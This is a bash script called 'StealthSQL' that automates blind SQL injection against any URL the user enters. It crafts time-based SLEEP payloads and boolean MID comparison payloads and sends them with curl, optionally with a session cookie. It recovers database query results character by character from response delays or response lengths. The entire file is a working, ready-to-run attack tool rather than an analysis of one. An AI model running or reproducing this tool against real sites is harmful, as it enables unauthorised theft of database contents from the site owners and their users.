#!/bin/bash


function make_request {
    local response
    if [ -z "$session_cookie" ]; then
        response=$(curl -s -k "$1")
    else
        response=$(curl -s -k --cookie "$session_cookie" "$1")
    fi
    echo "$response"
}


function color_print {
    clear
    echo -e "$output" | awk 'BEGIN {print "\033[1;32m"} {print} END {print "\033[0m"}'
    sleep 1
}


function color_print_attempt {
    clear
    echo -e "\033[1;32m$output\033[0m"
    echo -e "\033[1;31m[*] Trying: $1\033[0m"
}


function get_query_output {
    local query="$1"
    local row_number="$2"
    local count="$3"
    local flag=true
    local query_output=""
    local temp_query_output=""
    local dictionary=""

    if [ "$count" == true ]; then
        dictionary="0123456789"
    else
        dictionary="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    fi

    while [ "$flag" = true ]; do
        flag=false
        for ((j=1; j<1000; j++)); do
            for ((i=0; i<${#dictionary}; i++)); do
                temp_query_output="$query_output${dictionary:$i:1}"
                color_print_attempt "$temp_query_output"

                if [ "$method" == "T" ]; then
                    if [ "$count" == true ]; then
                        payload="' AND IF(MID((select count(*) from ($query) as totalCount),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo -e "\nGetting rows count...\n"
                    else
                        payload="' AND IF(MID(($query limit $row_number,1),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo -e "\nScanning row $(($row_number+1))/$total_rows...\n"
                    fi
                    full_url="$url$payload"
                    start_time=$(date +%s)
                    response=$(make_request "$full_url")
                    elapsed_time=$(( $(date +%s) - start_time ))
                    if [ "$elapsed_time" -ge "$time_sleep" ]; then
                        flag=true
                        break
                    fi
                elif [ "$method" == "B" ]; then
                    if [ "$count" == true ]; then
                        payload="' AND (MID((select count(*) from ($query) as totalCount),$j,1))!'${dictionary:$i:1}'--+"
                        echo -e "\nGetting rows count...\n"
                    else
                        payload="' AND (MID(($query limit $row_number,1),$j,1))!'${dictionary:$i:1}'--+"
                        echo -e "\nScanning row $(($row_number+1))/$total_rows...\n"
                    fi
                    full_url="$url$payload"
                    response=$(make_request "$full_url")
                    current_length=$(echo -n "$response" | wc -c)
                    if [ "$current_length" -ne "$default_length" ]; then
                        flag=true
                        break
                    fi
                fi
                flag=false
            done
            if [ "$flag" = true ]; then
                query_output="$temp_query_output"
                continue
            fi
            break
        done
    done

    echo "$query_output"
}


function blind_sql_injection {
    local method="$1"
    local query_input="$2"
    local payload=""
    local query_output=""

    if [ "$method" == "B" ]; then
        echo "Using Boolean Blind SQL Injection"
        default_length=$(make_request "$url" | wc -c)
    else
        time_sleep=${3:-3}
        echo "Using Time-Based Blind SQL Injection with ${time_sleep}s sleep time"
        sleep 1
    fi

  
    total_rows=$(get_query_output "$query_input" 0 true)
    output+="\nTotal rows: $total_rows\n"
    color_print

    for ((i=0; i<total_rows; i++)); do
        current_output=$(get_query_output "$query_input" "$i")
        output+="\n[+] Query output: $current_output"
        total_output="$output\n"
        color_print
    done

    if [ "$total_rows" -gt 1 ]; then
        echo -e "\n[+] All rows:\n"
        output="$total_output"
        color_print
    fi

    total_time=$(( $(date +%s) - initial_time ))
    echo "Total time: $(date -u -d @$total_time +'%H:%M:%S') seconds!"
}




echo "******************************************"
echo "*              StealthSQL                *"
echo "*          SQL Injection Tool            *"
echo "*      ----------------------------      *"
echo "*                        by @ImKKingshuk *"
echo "* Github- https://github.com/ImKKingshuk *"
echo "******************************************"
echo


read -p "Enter the target URL (e.g., https://www.example.com): " url
url="${url%/}" 


read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie

while true; do
    read -p "SQLi type [T/B]: " method
    read -p "SQL query: " query_input
    if [[ ! "$query_input" == *"*"* ]]; then
        break
    fi
    echo "Please specify a column name!"
done

blind_sql_injection "$method" "$query_input"
